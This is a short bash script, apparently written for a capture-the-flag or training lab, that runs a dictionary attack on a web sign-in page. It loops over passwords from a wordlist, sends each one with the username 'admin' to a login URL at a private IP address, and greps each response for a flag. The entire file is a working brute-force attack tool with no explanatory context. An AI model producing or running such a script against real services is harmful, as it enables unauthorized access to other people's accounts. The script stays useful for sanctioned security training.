#!/bin/bash

urlStart="http://192.168.56.103/?page=signin&username=admin&password="
urlEnd="&Login=Login#"

file="dictionary.txt"

while read -r line; do
	urlFinal=$urlStart$line$urlEnd
    cmd="$(curl -X GET "$urlFinal" | grep flag)"
	echo "${cmd}"
done <$file 